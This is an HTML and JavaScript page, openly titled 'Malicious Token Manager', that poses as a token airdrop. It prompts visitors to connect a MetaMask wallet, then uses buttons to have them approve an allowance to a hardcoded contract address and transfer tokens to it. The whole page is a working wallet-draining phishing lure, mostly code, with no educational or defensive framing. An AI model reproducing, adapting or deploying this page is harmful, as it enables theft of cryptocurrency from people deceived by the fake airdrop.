<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Malicious Token Manager</title>
    <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background: #f4f4f4;
            text-align: center;
        }
        header {
            background: #333;
            color: #fff;
            padding: 10px 0;
        }
        button {
            padding: 10px 20px;
            margin: 10px;
            background-color: #007bff;
            color: white;
            border: none;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
        input {
            padding: 10px;
            margin: 10px;
            width: 80%;
        }
    </style>
</head>
<body>
    <header>
        <h1>Malicious Token Manager</h1>
        <p>Connect your wallet to participate in the airdrop.</p>
    </header>

    <div id="app">
        <button id="connectWallet">Connect Wallet</button>

        <div id="userActions" style="display: none;">
            <p>Your Wallet: <span id="walletAddress"></span></p>
            <button id="checkBalance">Check Balance</button>
            <p id="balanceDisplay"></p>

            <button id="approveTokens">Approve Tokens</button>
            <input type="number" id="approveAmount" placeholder="Amount to approve">

            <button id="transferTokens">Transfer Tokens</button>
            <input type="number" id="transferAmount" placeholder="Amount to transfer">
        </div>
    </div>

    <script>
        const contractAddress = "0x70abc29bA40d6BCBE9389bcF4DdaCC252bC0bBe4";
        const contractABI = [
            {"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
            {"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
            {"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
            {"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}
        ];

        let web3;
        let contract;
        let userAddress;

        // Connect wallet
        document.getElementById("connectWallet").addEventListener("click", async () => {
            if (window.ethereum) {
                web3 = new Web3(window.ethereum);
                await window.ethereum.enable();
                const accounts = await web3.eth.getAccounts();
                userAddress = accounts[0];
                document.getElementById("walletAddress").textContent = userAddress;
                document.getElementById("userActions").style.display = "block";

                contract = new web3.eth.Contract(contractABI, contractAddress);
            } else {
                alert("MetaMask is not installed!");
            }
        });

        // Check balance
        document.getElementById("checkBalance").addEventListener("click", async () => {
            if (!contract || !userAddress) return alert("Connect wallet first!");
            const balance = await contract.methods.balanceOf(userAddress).call();
            document.getElementById("balanceDisplay").textContent = `Balance: ${web3.utils.fromWei(balance, 'ether')} tokens`;
        });

        // Approve tokens
        document.getElementById("approveTokens").addEventListener("click", async () => {
            if (!contract || !userAddress) return alert("Connect wallet first!");
            const amount = document.getElementById("approveAmount").value;
            if (!amount) return alert("Enter an amount to approve.");

            const weiAmount = web3.utils.toWei(amount, 'ether');
            await contract.methods.approve(contractAddress, weiAmount).send({ from: userAddress });
            alert("Tokens approved successfully.");
        });

        // Transfer tokens
        document.getElementById("transferTokens").addEventListener("click", async () => {
            if (!contract || !userAddress) return alert("Connect wallet first!");
            const amount = document.getElementById("transferAmount").value;
            if (!amount) return alert("Enter an amount to transfer.");

            const weiAmount = web3.utils.toWei(amount, 'ether');
            await contract.methods.transfer(contractAddress, weiAmount).send({ from: userAddress });
            alert("Tokens transferred successfully.");
        });
    </script>
</body>
</html>
